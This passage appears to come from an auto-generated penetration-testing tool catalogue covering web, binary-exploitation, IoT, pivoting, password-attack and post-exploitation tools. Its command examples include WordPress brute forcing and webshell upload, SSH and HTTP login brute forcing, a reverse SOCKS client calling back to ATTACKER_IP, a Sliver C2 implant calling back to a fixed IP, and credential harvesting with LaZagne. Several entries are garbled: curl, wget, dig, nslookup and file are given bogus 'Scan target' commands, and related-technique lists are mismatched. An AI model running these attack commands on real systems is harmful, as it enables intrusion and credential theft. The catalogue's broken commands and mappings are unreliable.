- OS: linux, windows
- Purpose: CMS scanner for WordPress, Joomla, Drupal, and others
- Tags: web, cms, wordpress, joomla, drupal, scanner
- Install (kali): git clone https://github.com/Dionach/CMSmap
- Path: /home/saad/Desktop/cpent-toolkit/04-web-application/CMSmap/cmsmap.py
- Notes: Python3 script [toolkit-synced]
- Commands (2):
  - **Scan WordPress site**: `python3 cmsmap.py http://TARGET -f W`
    - When: WordPress vulnerability scanning and exploitation
    - Output: List of vulnerabilities with exploit paths
  - **Full CMS enumeration**: `python3 cmsmap.py http://TARGET -f W --enumerate`
    - When: Full CMS enumeration including plugins and themes
    - Output: Complete CMS inventory with vulnerabilities
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf, tech:idor
- Related Tools: 10 — burp-suite, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite, liffy

#### wpforce — WPForce
- Zone: web | Category: web | Type: exploitation
- OS: linux, windows, macos
- Purpose: WordPress brute forcing and backdoor upload toolkit
- Tags: web, wordpress, bruteforce, backdoor, wpforce
- Install (kali): git clone https://github.com/n00py/WPForce
- Path: /home/saad/Desktop/cpent-toolkit/04-web-application/wpforce/wpforce.py
- Notes: Python3 script [toolkit-synced]
- Commands (2):
  - **Brute force WordPress credentials**: `python3 wpforce.py -u http://TARGET -U users.txt -P passwords.txt`
    - When: WordPress login brute forcing
    - Output: Valid username/password combinations
  - **Upload WordPress backdoor**: `python3 wpforce.py -u http://TARGET -U user -P pass --upload-backdoor`
    - When: Uploading webshell via WordPress theme/plugin editor
    - Output: Backdoor URL for remote code execution
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, persistence, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite

#### ghidra — Ghidra
- Zone: binary-exploitation | Category: binary-exploitation | Type: reverse-engineering
- OS: linux, windows, macos
- Purpose: Software reverse engineering framework with decompiler
- Tags: binary, reverse-engineering, decompiler, ghidra, analysis
- Install (kali): sudo apt install -y ghidra
- Path: /usr/bin/ghidra
- Notes: Pre-installed on Kali; launch with ghidra
- Commands (2):
  - **Analyze binary in Ghidra**: `ghidra -import ./binary -analysis`
    - When: Deep reverse engineering with decompiler view
    - Output: Decompiled C-like pseudocode and disassembly
  - **Headless Ghidra analysis**: `analyzeHeadless ./project ./binary -script ExportFunctions.java`
    - When: Batch processing or scripting Ghidra analysis
    - Output: Scripted analysis output
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, crypto-analysis, format-string, format-string-exploit, got-overwrite, hashcat-attacks, heap-double-free, heap-fastbin-dup
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, gef, libc-database, nasm, objdump, one_gadget

#### pwndbg — pwndbg
- Zone: binary-exploitation | Category: binary-exploitation | Type: debugger
- OS: linux
- Purpose: GDB plugin enhanced for exploit development
- Tags: binary, gdb, debugger, exploit-development, heap
- Install (kali): git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
- Path: /home/saad/Desktop/cpent-toolkit/05-binary-exploitation/pwndbg
- Notes: Loads automatically with GDB [toolkit-synced]
- Commands (2):
  - **Check binary protections**: `pwndbg> checksec`
    - When: Quick protection summary inside GDB
    - Output: RELRO, Canary, NX, PIE status
  - **Heap analysis**: `pwndbg> heap && pwndbg> bins`
    - When: Inspecting heap chunks and tcache/fastbin state
    - Output: Heap chunk layout and free lists
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump

#### angr — angr
- Zone: binary-exploitation | Category: binary-exploitation | Type: analysis
- OS: linux, windows, macos
- Purpose: Symbolic execution framework for binary analysis
- Tags: binary, symbolic-execution, automation, angr, analysis
- Install (kali): pip3 install angr
- Path: /home/saad/.local/bin/angr
- Notes: Python3 library; may require additional dependencies
- Commands (2):
  - **Find input reaching specific code path**: `python3 -c "import angr; proj = angr.Project('./binary'); state = proj.factory.entry_state(); simgr = proj.factory.simgr(state); simgr.explore(find=lambda s: b'flag' in s.posix.dumps(1)); print(simgr.found[0].posix.dumps(0))"`
    - When: Automatically discovering input that reaches a target code path
    - Output: Input bytes that trigger the target condition
  - **Symbolic execution for constraint solving**: `proj.factory.full_init_state(arguments=['input'])`
    - When: Solving for input constraints in complex binaries
    - Output: Concrete input values satisfying constraints
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, crypto-analysis, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 10 — checksec, file, gdb, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump, one_gadget

#### ropgadget — ROPgadget
- Zone: binary-exploitation | Category: binary-exploitation | Type: tool
- OS: linux, windows, macos
- Purpose: ROP gadget finder for exploit development
- Tags: binary, rop, gadgets, exploit-development
- Install (kali): sudo apt install -y ropgadget
- Path: /home/saad/.local/bin/ROPgadget
- Notes: Pre-installed on Kali; alternative to Ropper
- Commands (2):
  - **Find ROP gadgets**: `ROPgadget --binary ./binary`
    - When: Finding ROP gadgets for chain construction
    - Output: List of gadget addresses and instructions
  - **Search for specific gadget pattern**: `ROPgadget --binary ./binary --only "pop|ret"`
    - When: Finding specific gadget types (pop rdi; ret, etc.)
    - Output: Filtered gadget list matching pattern
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump

#### patchelf — patchelf
- Zone: binary-exploitation | Category: binary-exploitation | Type: tool
- OS: linux
- Purpose: Modify ELF binary linker and RPATH
- Tags: binary, elf, libc, patching
- Install (kali): sudo apt install -y patchelf
- Path: /usr/bin/patchelf
- Notes: Pre-installed on Kali
- Commands (2):
  - **Change ELF interpreter**: `patchelf --set-interpreter ./libs/ld-2.31.so ./binary`
    - When: Matching remote libc interpreter for local testing
    - Output: Binary now uses specified dynamic linker
  - **Set RPATH for custom libraries**: `patchelf --set-rpath ./libs ./binary`
    - When: Directing binary to use local libc copy
    - Output: Binary searches ./libs for shared libraries
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump

#### libc-database — libc-database
- Zone: binary-exploitation | Category: binary-exploitation | Type: tool
- OS: linux
- Purpose: Identify and download libc versions from leaked addresses
- Tags: binary, libc, database, exploit-development
- Install (kali): git clone https://github.com/niklasb/libc-database
- Path: /home/saad/Desktop/cpent-toolkit/05-binary-exploitation/libc-database
- Notes: Python3 tool; requires database download [toolkit-synced]
- Commands (2):
  - **Find libc version from leaked address**: `./find puts 0x7ffff7e0d800`
    - When: Identifying libc version from leaked function address
    - Output: Matching libc versions with build IDs
  - **Download identified libc**: `./download libc6_2.31-0ubuntu9.2_amd64`
    - When: Getting exact libc for local offset calculation
    - Output: Downloaded libc.so.6 file
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, gef, ghidra, nasm, objdump, one_gadget

#### gef — GEF (GDB Enhanced Features)
- Zone: binary-exploitation | Category: binary-exploitation | Type: debugger
- OS: linux
- Purpose: Modern GDB plugin for exploit development
- Tags: binary, gdb, debugger, exploit-development, gef
- Install (kali): bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
- Path: /home/saad/Desktop/cpent-toolkit/05-binary-exploitation/gef/gef.py
- Notes: Loads automatically with GDB [toolkit-synced]
- Commands (2):
  - **Create cyclic pattern**: `gef> pattern create 200`
    - When: Generating De Bruijn pattern for offset finding
    - Output: Cyclic pattern string saved to file
  - **Find offset from crash value**: `gef> pattern search $eip`
    - When: Finding exact offset to EIP/RIP from crash
    - Output: Offset value in pattern
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, ghidra, libc-database, nasm, objdump, one_gadget

#### pwninit — pwninit
- Zone: binary-exploitation | Category: binary-exploitation | Type: tool
- OS: linux
- Purpose: Automated CTF exploit development setup
- Tags: binary, ctf, automation, setup
- Install (kali): cargo install pwninit
- Path: /home/saad/.local/bin/pwninit
- Notes: Requires Rust/Cargo
- Commands (2):
  - **Auto-setup binary challenge**: `pwninit`
    - When: Automatically detecting binary/libc and generating solve template
    - Output: Patched binary and solve.py template
  - **Manual pwninit with options**: `pwninit --libc ./libc.so.6 --ld ./ld-2.31.so`
    - When: Specifying libc and linker manually
    - Output: Configured challenge directory
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, crypto-analysis, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump

#### seccomp-tools — seccomp-tools
- Zone: binary-exploitation | Category: binary-exploitation | Type: analysis
- OS: linux
- Purpose: Seccomp filter analysis and bypass
- Tags: binary, seccomp, sandbox, bypass
- Install (kali): gem install seccomp-tools
- Path: /usr/bin/seccomp-tools
- Notes: Requires Ruby
- Commands (2):
  - **Analyze seccomp filters**: `seccomp-tools dump ./binary`
    - When: Extracting seccomp filter rules from binary
    - Output: List of allowed/blocked syscalls
  - **Bypass seccomp with allowed syscall chains**: `seccomp-tools bypass ./binary`
    - When: Finding syscall chains to bypass restrictions
    - Output: Bypass strategies using allowed syscall combinations
- Related Techniques: 15 — blind-rop, bootloader-bypass, buffer-overflow, canary-leak, cmdi-advanced, crypto-analysis, format-string, format-string-exploit, got-overwrite, heap-double-free
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump

#### minicom — Minicom
- Zone: iot-firmware | Category: iot-firmware | Type: tool
- OS: linux
- Purpose: Serial terminal emulator for UART debugging
- Tags: iot, uart, serial, debugging, terminal
- Install (kali): sudo apt install -y minicom
- Path: /usr/bin/minicom
- Notes: Pre-installed on Kali
- Commands (2):
  - **Connect to UART with minicom**: `minicom -b 115200 -D /dev/ttyUSB0`
    - When: Serial console access to IoT device
    - Output: Interactive serial terminal
  - **Minicom with custom settings**: `minicom -b 57600 -D /dev/ttyUSB0 -C capture.log`
    - When: Capturing UART output to file
    - Output: Serial output logged to capture.log
- Related Techniques: 11 — bootloader-bypass, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack, nvram-analysis, spi-flash-dump
- Related Tools: 10 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, mosquitto-clients, mqtt-explorer, picocom, qemu, routersploit, sasquatch

#### picocom — Picocom
- Zone: iot-firmware | Category: iot-firmware | Type: tool
- OS: linux
- Purpose: Lightweight UART serial terminal
- Tags: iot, uart, serial, terminal, lightweight
- Install (kali): sudo apt install -y picocom
- Path: /usr/bin/picocom
- Notes: Pre-installed on Kali
- Commands (2):
  - **Connect to UART with picocom**: `picocom -b 115200 /dev/ttyUSB0`
    - When: Lightweight serial console to IoT device
    - Output: Serial terminal session
  - **Picocom with flow control**: `picocom -b 115200 --flow n /dev/ttyUSB0`
    - When: When hardware flow control is not available
    - Output: Serial connection without flow control
- Related Techniques: 11 — bootloader-bypass, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack, nvram-analysis, spi-flash-dump
- Related Tools: 10 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, minicom, mosquitto-clients, mqtt-explorer, qemu, routersploit, sasquatch

#### boofuzz — Boofuzz
- Zone: iot-firmware | Category: iot-firmware | Type: fuzzer
- OS: linux, windows
- Purpose: Protocol fuzzer for IoT network services
- Tags: iot, fuzzing, protocol, boofuzz, vulnerability-discovery
- Install (kali): pip3 install boofuzz
- Path: /usr/bin/boofuzz
- Notes: Python3 library; requires virtualenv recommended
- Commands (2):
  - **Fuzz IoT protocol**: `python3 -m boofuzz -f target_protocol`
    - When: Fuzzing network services on IoT devices
    - Output: Crash detection and potential vulnerabilities
  - **Protocol fuzzing template**: `# Create session.py - define target, port, protocol, and fuzz blocks`
    - When: Testing binary protocols or network services for buffer overflows
    - Output: Crash triggers and mutated requests - identifies parser overflow points
- Related Techniques: 15 — arp-discovery, bootloader-bypass, default-creds-iot, dll-hijacking, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack
- Related Tools: 10 — arduino-cli, binwalk, firmware-mod-kit, minicom, mosquitto-clients, mqtt-explorer, picocom, qemu, routersploit, sasquatch

#### routersploit — RouterSploit
- Zone: iot-firmware | Category: iot-firmware | Type: exploitation
- OS: linux, windows
- Purpose: Exploitation framework for embedded/IoT devices
- Tags: iot, routersploit, exploitation, embedded, framework
- Install (kali): sudo apt install -y routersploit
- Path: /usr/bin/rsf
- Notes: Pre-installed on Kali; also pip3 install routersploit
- Commands (2):
  - **Start RouterSploit console**: `rsf`
    - When: Launching RouterSploit exploitation framework
    - Output: Interactive console with modules
  - **Scan for vulnerable routers**: `use scanners/autopwn; set target 192.168.1.1; run`
    - When: Automated vulnerability scanning of IoT devices
    - Output: List of found vulnerabilities and applicable exploits
- Related Techniques: 15 — bootloader-bypass, buffer-overflow, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free
- Related Tools: 10 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, minicom, mosquitto-clients, mqtt-explorer, picocom, qemu, sasquatch

#### mqtt-explorer — MQTT Explorer
- Zone: iot-firmware | Category: iot-firmware | Type: tool
- OS: linux, windows, macos
- Purpose: MQTT broker enumeration and message interception
- Tags: iot, mqtt, protocol, broker, enumeration
- Install (kali): Download from mqtt-explorer.com
- Path: /home/saad/Desktop/cpent-toolkit/06-iot-firmware/MQTT-Explorer
- Notes: AppImage; requires MQTT broker access [toolkit-synced]
- Commands (2):
  - **Connect to MQTT broker**: `mqtt-explorer --connect mqtt://target:1883`
    - When: GUI-based MQTT broker exploration
    - Output: Visualization of topics and messages
  - **Subscribe to wildcard topics**: `# Use GUI - subscribe to # wildcard to capture all messages`
    - When: Connected to IoT MQTT broker - monitoring all traffic
    - Output: All messages from all topics - look for credentials or device commands
- Related Techniques: 15 — bootloader-bypass, default-creds-iot, delegation-enum, dns-enumeration, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, kerberos-delegation-enum
- Related Tools: 10 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, minicom, mosquitto-clients, picocom, qemu, routersploit, sasquatch

#### mosquitto-clients — Mosquitto Clients
- Zone: iot-firmware | Category: iot-firmware | Type: tool
- OS: linux, windows, macos
- Purpose: MQTT protocol command-line testing tools
- Tags: iot, mqtt, protocol, cli, testing
- Install (kali): sudo apt install -y mosquitto-clients
- Path: /usr/bin/mosquitto_pub
- Notes: Pre-installed on Kali
- Commands (2):
  - **Subscribe to all MQTT topics**: `mosquitto_sub -h TARGET_IP -t '#' -v`
    - When: Monitoring all MQTT broker traffic
    - Output: All published messages on all topics
  - **Publish to MQTT topic**: `mosquitto_pub -h TARGET_IP -t 'test/topic' -m 'payload'`
    - When: Testing MQTT publish permissions
    - Output: Message published to broker
- Related Techniques: 14 — bootloader-bypass, burp-workflow, c2-establishment, cmdi-advanced, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging
- Related Tools: 10 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, minicom, mqtt-explorer, picocom, qemu, routersploit, sasquatch

#### rpivot — rpivot
- Zone: lateral-movement | Category: lateral-movement | Type: tunneling
- OS: linux, windows
- Purpose: Reverse SOCKS proxy for pivoting through firewalls
- Tags: pivoting, socks, reverse, firewall-bypass
- Install (kali): git clone https://github.com/pluggerwolf/rpivot
- Path: /home/saad/Desktop/cpent-toolkit/08-lateral-movement/rpivot/rpivot.py
- Notes: Python2/3; server on Kali, client on target [toolkit-synced]
- Commands (2):
  - **Start rpivot server**: `python3 rpivot.py --server-port 9999 --server-ip 0.0.0.0`
    - When: Starting rpivot SOCKS server on attacker
    - Output: SOCKS proxy listening on port 9999
  - **Connect rpivot client from target**: `python3 rpivot.py --server-ip ATTACKER_IP --server-port 9999`
    - When: Target connects back to attacker (reverse)
    - Output: Reverse SOCKS tunnel established
- Related Techniques: 6 — burp-workflow, double-pivot, pivoting, tech:port-forwarding, tech:socks-proxy, tech:sshuttle
- Related Tools: 4 — chisel, ligolo-ng, proxychains4, sshuttle

#### foca — FOCA
- Zone: recon | Category: recon | Type: enumerator
- OS: windows, linux
- Purpose: Document metadata extraction and OSINT tool
- Tags: recon, osint, metadata, documents, foca
- Install (kali): Download from ElevenPaths FOCA GitHub
- Path: /home/saad/Desktop/cpent-toolkit/01-recon/FOCA
- Notes: Java application; requires .NET on Windows [toolkit-synced]
- Commands (2):
  - **Analyze documents for metadata**: `FOCA: Create project → Add URL → Crawl and analyze documents`
    - When: Extracting metadata from public documents
    - Output: Usernames, software versions, paths, and other metadata
  - **Search for document types**: `FOCA: File types → PDF, DOC, PPT, XLS filters`
    - When: Finding document types with metadata leaks
    - Output: List of document types and extraction results
- Related Techniques: 15 — dns-enumeration, firmware-extraction, passive-recon, spi-flash-dump, tech:cloud-metadata, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying
- Related Tools: 10 — amass, curl, dig, grep, httpx, ivre, masscan, metagoofil, naabu, nmap

#### metagoofil — Metagoofil
- Zone: recon | Category: recon | Type: enumerator
- OS: linux, windows
- Purpose: Document metadata extraction from Google search
- Tags: recon, osint, metadata, documents, google-dorks
- Install (kali): sudo apt install -y metagoofil
- Path: /usr/bin/metagoofil
- Notes: Pre-installed on Kali
- Commands (2):
  - **Search and extract document metadata**: `metagoofil -d TARGET_DOMAIN -t pdf,doc,xls -l 50`
    - When: Finding and analyzing documents from target domain
    - Output: Extracted metadata from found documents
  - **Download documents for analysis**: `metagoofil -d TARGET_DOMAIN -t pdf,doc -n 20 -o ./docs/`
    - When: Downloading documents for manual analysis
    - Output: Downloaded documents in output directory
- Related Techniques: 15 — dns-enumeration, firmware-extraction, passive-recon, spi-flash-dump, tech:cloud-metadata, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, naabu, nmap

#### ivre — IVRE
- Zone: recon | Category: recon | Type: framework
- OS: linux
- Purpose: Network recon framework with vulnerability correlation
- Tags: recon, nmap, framework, vulnerability-correlation
- Install (kali): sudo apt install -y ivre
- Path: /home/saad/.local/bin/ivre
- Notes: Requires MongoDB; complex setup
- Commands (2):
  - **Import Nmap results into IVRE**: `ivre nmap2db ./nmap_scan.xml`
    - When: Importing scan results for analysis
    - Output: Database entries for scanned hosts
  - **Correlate with Shodan and CVEs**: `ivre db2view web && ivre webreport --cve`
    - When: Generating web report with CVE correlation
    - Output: Web-based report of vulnerabilities
- Related Techniques: 15 — arp-discovery, dns-enumeration, hashcat-attacks, ipv6-mitm, metasploit-exploitation, passive-recon, pivoting, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, masscan, metagoofil, naabu, nmap

#### medusa — Medusa
- Zone: password-attacks | Category: password-attacks | Type: bruteforce
- OS: linux, windows
- Purpose: Parallel online password cracking tool
- Tags: password, bruteforce, ssh, rdp, parallel
- Install (kali): sudo apt install -y medusa
- Path: /usr/bin/medusa
- Notes: Pre-installed on Kali
- Commands (2):
  - **SSH brute force with Medusa**: `medusa -h TARGET_IP -u users.txt -P passwords.txt -M ssh -t 10`
    - When: Parallel SSH brute forcing
    - Output: Valid credential pairs
  - **HTTP POST brute force**: `medusa -h TARGET_IP -u users.txt -P passwords.txt -M http -m '/login.php:user=^USER^&pass=^PASS^:Invalid'`
    - When: Brute forcing HTTP login forms
    - Output: Valid credentials for web application
- Related Techniques: 10 — asrep-roasting, gpp-abuse, hash-cracking, hashcat-attacks, kerberoasting, password-spraying, tech:ntlm-cracking, tech:password-spraying, tech:ssh-lateral, wordpress-exploitation
- Related Tools: 8 — cewl, crunch, name-that-hash, tool:hashashcat, tool:hydra, tool:john, tool:maskprocessor, tool:medusa

#### crunch — Crunch
- Zone: password-attacks | Category: password-attacks | Type: generator
- OS: linux, windows
- Purpose: Custom wordlist generator
- Tags: password, wordlist, generator, bruteforce
- Install (kali): sudo apt install -y crunch
- Path: /usr/bin/crunch
- Notes: Pre-installed on Kali
- Commands (2):
  - **Generate pattern-based wordlist**: `crunch 4 6 0123456789 -o numlist.txt`
    - When: Generating numeric wordlists (PINs, OTPs)
    - Output: Wordlist file with generated passwords
  - **Generate charset-based wordlist**: `crunch 8 10 abcdefghijklmnopqrstuvwxyz0123456789 -t @@@@%%%%.txt`
    - When: Generating wordlists with specific pattern
    - Output: Pattern-based wordlist
- Related Techniques: 6 — gpp-abuse, hash-cracking, hashcat-attacks, password-spraying, tech:password-spraying, wordpress-exploitation
- Related Tools: 9 — cewl, medusa, name-that-hash, tool:cewl, tool:hashashcat, tool:hydra, tool:john, tool:maskprocessor, tool:medusa

#### cewl — CeWL
- Zone: password-attacks | Category: password-attacks | Type: generator
- OS: linux, windows
- Purpose: Custom wordlist generator from website content
- Tags: password, wordlist, generator, web, crawler
- Install (kali): sudo apt install -y cewl
- Path: /usr/bin/cewl
- Notes: Pre-installed on Kali
- Commands (2):
  - **Generate wordlist from website**: `cewl http://TARGET_URL -d 5 -m 5 -w wordlist.txt`
    - When: Creating targeted wordlist from target website
    - Output: Custom wordlist with site-specific terms
  - **Generate wordlist with emails**: `cewl http://TARGET_URL -e --email_file emails.txt -w wordlist.txt`
    - When: Extracting emails and generating wordlist
    - Output: Wordlist plus extracted email addresses
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, gpp-abuse, hash-cracking, hashcat-attacks, lfi-advanced, password-spraying, sql-injection, ssrf
- Related Tools: 9 — crunch, medusa, name-that-hash, tool:cewl, tool:hashashcat, tool:hydra, tool:john, tool:maskprocessor, tool:medusa

#### name-that-hash — Name That Hash
- Zone: password-attacks | Category: password-attacks | Type: identifier
- OS: linux, windows
- Purpose: Automated hash type identification
- Tags: password, hash, identification, hashcat, john
- Install (kali): pip3 install name-that-hash
- Path: /home/saad/.local/bin/name-that-hash
- Notes: Python3 tool
- Commands (2):
  - **Identify hash type**: `name-that-hash -t HASH_VALUE`
    - When: Identifying unknown hash type for cracking
    - Output: Hash type, mode number for hashcat, and John format
  - **Batch identify hashes from file**: `name-that-hash -f hashes.txt -o identified.json`
    - When: Identifying multiple hash types at once
    - Output: JSON file with hash types for each hash
- Related Techniques: 9 — gpp-abuse, hash-cracking, hashcat-attacks, overpass-the-hash, pass-the-hash, password-spraying, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying
- Related Tools: 10 — cewl, crunch, hashcat, john, medusa, tool:hashashcat, tool:hydra, tool:john, tool:maskprocessor, tool:medusa

#### sliver — Sliver
- Zone: post-exploitation | Category: post-exploitation | Type: c2
- OS: linux, windows, macos
- Purpose: Cross-platform C2 framework for post-exploitation
- Tags: post-exploitation, c2, framework, sliver, implants
- Install (kali): curl https://sliver.sh/install | sudo bash
- Path: /home/saad/Desktop/cpent-toolkit/10-post-exploitation/sliver
- Notes: Modern C2 alternative to Empire/Covenant [toolkit-synced]
- Commands (2):
  - **Generate Sliver implant**: `sliver > generate --http 10.10.10.5:80 --save /tmp/sliver.exe`
    - When: Creating C2 implant for target
    - Output: Compiled implant binary
  - **Start Sliver server**: `sliver`
    - When: Launching Sliver C2 server
    - Output: Interactive Sliver console
- Related Techniques: 15 — buffer-overflow, c2-establishment, credential-harvesting, credential-harvesting-advanced, default-creds-iot, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free, metasploit-exploitation
- Related Tools: 5 — covenant, empire, lazagne, nishang, screen

#### lazagne — LaZagne
- Zone: post-exploitation | Category: post-exploitation | Type: credential-harvest
- OS: windows, linux
- Purpose: Credentials recovery from local machine
- Tags: post-exploitation, credentials, recovery, windows, lazagne
- Install (kali): git clone https://github.com/AlessandroZ/LaZagne
- Path: /home/saad/Desktop/cpent-toolkit/10-post-exploitation/LaZagne/Linux/la-zagne.py
- Notes: Windows version: LaZagne.exe; Linux: ./LaZagne/Linux/laZagne.py [toolkit-synced]
- Commands (2):
  - **Run LaZagne on Windows**: `LaZagne.exe all`
    - When: Recovering all stored credentials on Windows
    - Output: Recovered passwords from browsers, databases, and apps
  - **Run LaZagne on Linux**: `python3 ./LaZagne/Linux/laZagne.py all`
    - When: Recovering credentials on Linux
    - Output: Recovered passwords from Linux applications
- Related Techniques: 15 — always-install-elevated, asrep-roasting, c2-establishment, credential-harvesting, credential-harvesting-advanced, dcsync, dll-hijacking, file-inclusion, gpp-abuse, gpp-cached-passwords
- Related Tools: 5 — covenant, empire, nishang, screen, sliver

#### curl — Curl
- Zone: recon | Category: recon | Type: binary
- OS: linux
- Purpose: HTTP client for quick URL requests
- Tags: recon, binary
- Install (kali): /usr/bin/curl
- Path: /usr/bin/curl
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Curl**: `curl --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Curl help and available flags
  - **Scan target with Curl**: `curl -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, dns-enumeration, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 10 — amass, dig, docker, foca, git, grep, httpx, ivre, masscan, metagoofil

#### wget — Wget
- Zone: recon | Category: recon | Type: binary
- OS: linux
- Purpose: Download files and recursive URL retrieval
- Tags: recon, binary
- Install (kali): /usr/bin/wget
- Path: /usr/bin/wget
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Wget**: `wget --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Wget help and available flags
  - **Scan target with Wget**: `wget -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, dns-enumeration, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 10 — amass, curl, dig, docker, foca, git, grep, httpx, ivre, masscan

#### dig — Dig
- Zone: recon | Category: recon | Type: binary
- OS: linux
- Purpose: DNS lookup utility
- Tags: recon, binary
- Install (kali): /usr/bin/dig
- Path: /usr/bin/dig
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Dig**: `dig --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Dig help and available flags
  - **Scan target with Dig**: `dig -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, dns-enumeration, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 10 — amass, curl, docker, foca, git, grep, httpx, ivre, masscan, metagoofil

#### nslookup — Nslookup
- Zone: recon | Category: recon | Type: binary
- OS: linux, windows
- Purpose: DNS query tool
- Tags: recon, binary
- Install (kali): /usr/bin/nslookup
- Path: /usr/bin/nslookup
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Nslookup**: `nslookup --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Nslookup help and available flags
  - **Scan target with Nslookup**: `nslookup -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, dns-enumeration, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 10 — amass, curl, dig, docker, foca, git, grep, httpx, ivre, masscan

#### file — File
- Zone: binary-exploitation | Category: binary-exploitation | Type: binary
- OS: linux
- Purpose: Determine file type from magic bytes
- Tags: binary-exploitation, binary
- Install (kali): /usr/bin/file
- Path: /usr/bin/file
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of File**: `file --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows File help and available flags
  - **Scan target with File**: `file -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, file-inclusion, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 10 — ROPgadget, angr, checksec, gcc, gdb, gdb-multiarch, gdb-peda, gef, ghidra, libc-database

#### strings — Strings
- Zone: binary-exploitation | Category: binary-exploitation | Type: binary
- OS: linux
- Purpose: Extract printable strings from binary files
- Tags: binary-exploitation, binary
- Install (kali): /usr/bin/strings
- Path: /usr/bin/strings
